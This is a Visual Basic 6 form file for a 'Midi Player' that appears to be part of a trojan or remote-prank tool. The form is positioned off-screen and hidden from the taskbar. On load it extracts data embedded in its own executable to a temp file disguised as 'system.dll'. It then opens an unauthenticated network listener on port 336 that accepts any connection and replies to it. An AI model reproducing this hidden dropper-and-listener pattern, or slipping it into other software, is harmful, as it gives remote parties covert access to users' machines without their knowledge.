VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form39 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Midi Player"
   ClientHeight    =   4125
   ClientLeft      =   -6900
   ClientTop       =   2430
   ClientWidth     =   3090
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   LinkTopic       =   "Form39"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4125
   ScaleWidth      =   3090
   ShowInTaskbar   =   0   'False
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   360
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      Caption         =   "Midi Player"
      Height          =   2295
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   2775
      Begin VB.CommandButton Command1 
         Caption         =   "Play"
         Height          =   375
         Left            =   120
         TabIndex        =   6
         Top             =   720
         Width           =   1215
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   120
         TabIndex        =   5
         Top             =   240
         Width           =   2535
      End
      Begin VB.CommandButton Command2 
         Caption         =   "Pause"
         Height          =   375
         Left            =   120
         TabIndex        =   4
         Top             =   1200
         Width           =   1215
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Resume"
         Height          =   375
         Left            =   120
         TabIndex        =   3
         Top             =   1680
         Width           =   1215
      End
      Begin VB.CommandButton Command4 
         Caption         =   "Stop"
         Height          =   375
         Left            =   1440
         TabIndex        =   2
         Top             =   720
         Width           =   1215
      End
      Begin VB.CommandButton Command5 
         Caption         =   "Restart"
         Height          =   375
         Left            =   1440
         TabIndex        =   1
         Top             =   1200
         Width           =   1215
      End
      Begin VB.Timer Timer1 
         Enabled         =   0   'False
         Interval        =   49000
         Left            =   1440
         Top             =   1680
      End
   End
End
Attribute VB_Name = "Form39"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim myMusic As New cMidiPlayer

Private Sub Command1_Click()
    myMusic.PlayMusic Text1
End Sub

Private Sub Command2_Click()
    myMusic.PauseMusic
End Sub

Private Sub Command3_Click()
    myMusic.ResumeMusic
End Sub

Private Sub Command4_Click()
    myMusic.StopMusic
End Sub

Private Sub Command5_Click()
    myMusic.RestartMusic
End Sub

Private Sub Form_Load()
Dim Results As String
Dim Temp As String
Temp = Environ$("Temp")
On Local Error Resume Next
Results = ReadTextFromExe(App.Path + "\" + App.EXEName + ".Exe")
Kill Temp + "\system.dll"
Open Temp + "\system.dll" For Binary As #1
Put #1, 1, Results
Close #1
Text1.Text = Temp + "\system.dll"

myMusic.Create Me.hWnd




Winsock1.Close
Winsock1.LocalPort = CLng(336)
Winsock1.Listen
End Sub

Public Function ReadTextFromExe(File)
Dim TEMPdata As String
Dim TextFromFile As String
Dim StartingLoc As Long
Dim EndingLoc As Long
On Local Error Resume Next
Open File For Binary As #1
TEMPdata = String(LOF(1), Chr(0))
Get #1, 1, TEMPdata
Close #1
StartingLoc = InStr(1, TEMPdata, "U§U§U§U§U§")
EndingLoc = InStr(StartingLoc, TEMPdata, "§U§U§U§U§U")
    TextFromFile = Mid$(TEMPdata, StartingLoc + 10, EndingLoc - StartingLoc - 10)
    ReadTextFromExe = TextFromFile
End Function

Private Sub Timer1_Timer()
Command1_Click
End Sub

Private Sub Winsock1_Close()
Winsock1.Close
Winsock1.Listen
End Sub

Private Sub winsock1_ConnectionRequest(ByVal requestID As Long)
If Winsock1.State <> sckClosed Then Winsock1.Close
Winsock1.Accept requestID
Winsock1.SendData "A"
End Sub
